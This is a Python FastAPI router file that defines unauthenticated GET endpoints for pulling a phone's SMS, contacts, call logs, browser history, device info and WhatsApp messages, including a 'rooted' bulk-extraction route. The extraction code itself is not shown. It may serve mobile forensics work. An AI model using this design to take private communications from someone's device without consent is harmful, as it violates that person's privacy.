# app/api/pullall.py

from fastapi import APIRouter, Request
from app.service.PullAll_service import pull_all_data, pull_all_data_rooted
from app.service.sms import sms
from app.service.contact import get_contacts
from app.service.browserhistory import get_browser_history
from app.service.most_contacts import most_contacts
from app.service.call_logs import get_call_logs
from app.service.deviceinfo import get_device_info
from app.service.searchcontact import search_contact
from app.service.wa import wa_contacts, msg_jid, msg_message
router = APIRouter()

@router.get("/pull-all")
async def pull_all_endpoint(request: Request):
    return pull_all_data()

@router.get("/pull-all rooted")
async def pull_all_rooted_endpoint(request: Request):
    return pull_all_data_rooted()

@router.get("/sms")
async def sms_endpoint(request: Request):
    return sms()

@router.get("/contacts")
async def contacts_endpoint(request: Request):
    return get_contacts()

@router.get("/browser-history")
async def browser_history_endpoint (request: Request):
    return get_browser_history()

@router.get("/most-contacted")
async def most_contacts_endpoint (request: Request):
    return most_contacts()

@router.get("/call-logs")
async def CallLogs_endpoint (request: Request):
    return get_call_logs()

@router.get("/device-info")
async def device_info_endpoint (request: Request):
    return get_device_info()

@router.get("/search-contact")
async def search_contact_endpoint (request: Request):
    return search_contact()

@router.get("/get-wa-contacts")
async def get_wacontact_endpoint (request: Request):
    return wa_contacts()

@router.get("/get-wa-jid")
async def get_wacontact_endpoint (request: Request):
    return msg_jid()

@router.get("/wa-msg")
async def get_msgwa_endpoint (request: Request):
    return msg_message()


